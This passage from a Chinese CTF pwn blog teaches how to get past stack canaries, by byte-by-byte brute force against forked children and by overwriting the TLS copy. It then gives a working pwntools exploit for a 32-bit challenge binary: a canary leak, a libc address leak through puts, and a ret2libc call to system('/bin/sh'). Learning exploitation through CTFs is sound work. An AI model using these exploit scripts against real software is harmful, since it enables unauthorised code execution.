class="string">&quot;welcome&quot;</span>);</span><br><span class="line">			fun();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line">padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) </span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;recv&#x27;</span> <span class="keyword">in</span> a:	</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804864d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line">cn.close()</span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br><span class="line"><span class="comment">#32位为‘3’,64位为‘7’</span></span><br></pre></td></tr></table></figure>
<p>这个模板可以说是经典了，遇到此类题目后改一改就好了</p>
<h2 id="覆盖TLS中储存的canary值"><a href="#覆盖TLS中储存的canary值" class="headerlink" title="覆盖TLS中储存的canary值"></a>覆盖TLS中储存的canary值</h2><p>canary的值存储在fs:[0x28]中</p>
<p>fs寄存器是由glibc定义的，存放Thread Local Storage （TLS）信息</p>
<p>该结构体如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">        <span class="keyword">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="keyword">int</span> multiple_threads;</span><br><span class="line">        <span class="keyword">int</span> gscope_flag;</span><br><span class="line">        <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="keyword">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
<p>这个 <strong>stack_guard</strong> 是在 <strong>libc_start_main</strong> 中进行设置和赋值的</p>
<p>一般来说，我们不知道TLS的位置，需要爆破脚本来找出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">offset=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./xxxx&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>				   </span><br><span class="line">    payload += (padding-<span class="number">8</span>)	 	     <span class="comment">#padding</span></span><br><span class="line">    payload += <span class="string">&#x27;aaaaaaaa&#x27;</span>		     <span class="comment">#fake canary </span></span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)		 <span class="comment">#rbp</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)			    <span class="comment">#返回地址</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span>*(offset-<span class="built_in">len</span>(payload))</span><br><span class="line">    p.send(payload)</span><br><span class="line">    temp = p.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxx&quot;</span> <span class="keyword">in</span> temp:</span><br><span class="line">        <span class="built_in">print</span>(offset)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset += <span class="number">1</span></span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">原本程序覆盖了canary是一定会报错的，但是payload后续填入的“a”可能会覆盖TLS，使程序通过canary</span></span><br><span class="line"><span class="string">只要程序通过了canary，‘p.recvall()’就会不接受到报错信息（stack_chk_fail）</span></span><br><span class="line"><span class="string">这之后我们就可以通过打印出的offset来计算偏移了</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>当然也可以不找偏移，直接一次性填入非常长的“a”也是可以覆盖的</p>
<p>覆盖TLS的方法只能在有“pthread_create”的题中可以用用，不然程序就很可能会覆盖关键数据，然后直接挂掉</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">canary爆破未遂+数据接收技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-04 22:03:51" itemprop="dateCreated datePublished" datetime="2022-01-04T22:03:51+08:00">2022-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-05 20:22:32" itemprop="dateModified" datetime="2022-01-05T20:22:32+08:00">2022-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天遇到一个题目，有canary并且在循环中用fork生成子进程，当时想都没有想就开始canary爆破，仔细分析代码后才发现出题人的阴险，先用fork引诱我进行canary爆破，等我把爆破脚本写好了再搞我一手，我现在真的怀疑这人是学社工的</p>
<p>通过学习其他大佬的WP，我了解到了一种新的接受数据的方式</p>
<p>这种方式在程序使用“printf”进行输出的时候还挺好用的</p>
<hr>
<p><strong>canary爆破未遂+数据接收技巧</strong></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288175862.png" alt="1641288175862">  </p>
<p>循环输入</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641287256715.png" alt="1641287256715"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641287265290.png" alt="1641287265290"> </p>
<p>32位，dynamically，开了NX，开了canary</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288063874.png" alt="1641288063874"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288075846.png" alt="1641288075846"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641288084647.png" alt="1641288084647"> </p>
<p><strong>代码分析</strong></p>
<p>getchar接受到“Y”后程序继续执行，然后getchar接收“Y”之后的字符（防止溢出）</p>
<p>fork函数执行以后，程序就把它自己复制了一遍，并且优先执行新进程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）在父进程中，fork返回新创建子进程的进程ID</span><br><span class="line"><span class="number">2</span>）在子进程中，fork返回<span class="number">0</span></span><br><span class="line"><span class="number">3</span>）如果出现错误，fork返回一个负值</span><br></pre></td></tr></table></figure>
<p>也就是说，返回“0”的子进程会进入函数“sub_8048B29”，而父进程不会</p>
<p>父进程会进行循环，源源不断地产生子进程</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/love-jelly-pig/p/8471206.html">fork()函数详解</a></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641289340337.png" alt="1641289340337"> </p>
<p>子进程会触发函数“read”，输入“0x200”字节到“malloc”分配的空间“buf”</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641289574670.png" alt="1641289574670"> </p>
<p>for循环会一直增加“i”的值，直到条件成立，然后“buf[i]”会被赋值为“0”</p>
<p>并且“i”必须为“4”的倍数（包括“0”）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data = i &amp; <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
<p>把“buf”赋值给“dest”后返回“1”，后面就是一个算法，通过一系列的位移操作使四个变成三个字符</p>
<p>​        // 其实就是base64加密</p>
<p><strong>入侵思路</strong></p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641290228902.png" alt="1641290228902"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641291871253.png" alt="1641291871253"> </p>
<p>“buf”和“dest”都在堆中，那么溢出点在那里呢？</p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641292428016.png" alt="1641292428016"> </p>
<p><img src="/2022/01/04/canary%E7%88%86%E7%A0%B4%E6%9C%AA%E9%81%82+%E6%95%B0%E6%8D%AE%E6%8E%A5%E6%94%B6%E6%8A%80%E5%B7%A7/1641292662924.png" alt="1641292662924"> </p>
<p>程序把“dest”进行加密，赋值给“v21”了</p>
<p>“dest”可以装“0x200”字节，而“v21”只能装“258”字节，计算得溢出了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x200</span> * <span class="number">3</span> / <span class="number">4</span> = <span class="number">384</span> &gt; <span class="number">269</span> <span class="comment">#在IDA上看的偏移  </span></span><br></pre></td></tr></table></figure>
<p>接下来就是考虑泄露Canary</p>
<p>一般程序涉及到“进程”和“线程”的时候，就会出现两种对应的canary绕过手段，前者为“canary爆破”，后者为“覆盖TLS”，这里使用前者</p>
<p>因为函数“fork”产生的字进程完全克隆父进程，canary也一样，所以这里可以采用canary爆破的方式，一字节一字节爆破canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): <span class="comment">#32位为‘3’,64位为‘7’</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        p.send( padding + canary + <span class="built_in">chr</span>(i)) <span class="comment">#从0~0xFF，依次注入</span></span><br><span class="line">        a = p.recvuntil(<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">in</span> a: </span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>重点就是这个“xxxx”写什么，程序的输出就只有这3种情况：</p>
<p>1.子进程正常结束：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line"><span class="number">1233</span></span><br><span class="line">Result <span class="keyword">is</span>:�m�</span><br><span class="line">Finish!</span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>2.子进程触发canary：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">Result <span class="keyword">is</span>:m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m��m�ۻ��<span class="number">4</span>�</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>3.子进程报错：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br><span class="line">Y</span><br><span class="line">Give me some datas:</span><br><span class="line"></span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">Something <span class="keyword">is</span> wrong</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">May be I can know <span class="keyword">if</span> you give me some data[Y/N]</span><br></pre></td></tr></table></figure>
<p>总结归纳一下：</p>
<p>接收字符串中有“Finish”：当前字符串正确</p>
<p>接收字符串中有“wrong”：程序长度不对</p>
<p>不管canary是否正确，只要长度不对，程序就会输出一样的东西，这一点完美卡死了canary爆破，后来发现canary可以用“覆盖低字节的方式”打印出来（”\n”覆盖”\x00”，这里是printf，所以不覆盖也可以）</p>
<p>​        // 原本想用新学的canary爆破练练手，没想到被出题人制裁了</p>
<p>这采用常规接收数据的方式：（直接计算）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:\n&quot;</span>) <span class="comment">#这里必须加&quot;\n&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">int</span>(<span class="number">258</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line">p.sendine(payload)</span><br><span class="line">p.recvline() <span class="comment">#接收了&#x27;\n&#x27;（&#x27;\n&#x27;用printf打印出来的时候占一整排，用recvline接收正好）</span></span><br><span class="line">canary =p.recv()[<span class="number">268</span>:<span class="number">271</span>] <span class="comment">#len(&#x27;Result is:&#x27;)+258，接收3字节（没有&quot;\x00&quot;）</span></span><br><span class="line">canary=<span class="string">&quot;\x00&quot;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary)</span><br></pre></td></tr></table></figure>
<p>还有一种更骚的操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>) <span class="comment">#这里可以不加&quot;\n&quot;</span></span><br><span class="line">payload=  base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">258</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())	<span class="comment">#输出接收到的数据</span></span><br><span class="line">recv= p.recv()</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span>+recv[recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">6</span>:recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary) <span class="comment">#rfind()返回字符串最后一次出现的位置</span></span><br></pre></td></tr></table></figure>
<p>我目前还不能理解这种收集数据的方式，但是它看起来还挺实用的，以后再研究</p>
<p>本题是给了libc库的，所以这么打：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> binascii     </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">p=process(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf_got= elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:\n&quot;</span>) <span class="comment">#注意：这里要多收集一个&quot;\n&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="built_in">int</span>(<span class="number">258</span>*<span class="number">4</span>/<span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline() </span><br><span class="line">canary =p.recv()[<span class="number">268</span>:<span class="number">271</span>] </span><br><span class="line">canary=<span class="string">&quot;\x00&quot;</span>+canary</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span> +canary)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>)</span><br><span class="line">payload = base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">257</span>+canary+<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>+p32(puts_plt)+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(setbuf_got))</span><br><span class="line"><span class="comment">#程序用base64对输入值进行了加密，所以这里需要进行解密</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">recv= p.recv()</span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line">setbuf_addr = u32(recv[recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">7</span>:recv.rfind(<span class="string">&#x27;AAAAAA&#x27;</span>)+<span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;setbuf_addr &gt;&gt; &quot;</span>+<span class="built_in">str</span>(setbuf_addr))</span><br><span class="line"></span><br><span class="line">system_offset=libc.symbols[<span class="string">&quot;system&quot;</span>] </span><br><span class="line">setbuf_offset=libc.symbols[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">system_addr=setbuf_addr+system_offset-setbuf_offset</span><br><span class="line"></span><br><span class="line">binsh_offset=<span class="number">0x192352</span>	</span><br><span class="line"><span class="comment">#strings -a -tx /lib/i386-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot; (直接输出16进制)</span></span><br><span class="line">binsh_addr = setbuf_addr+binsh_offset-setbuf_offset</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;May be I can know if you give me some data[Y/N]&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me some datas:&quot;</span>)</span><br><span class="line">payload = base64.b64encode(<span class="string">&#x27;A&#x27;</span>*<span class="number">257</span>+canary+<span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>+p32(system_addr)+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(binsh_addr))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>网上还有一个更nb的，自己找libc版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span 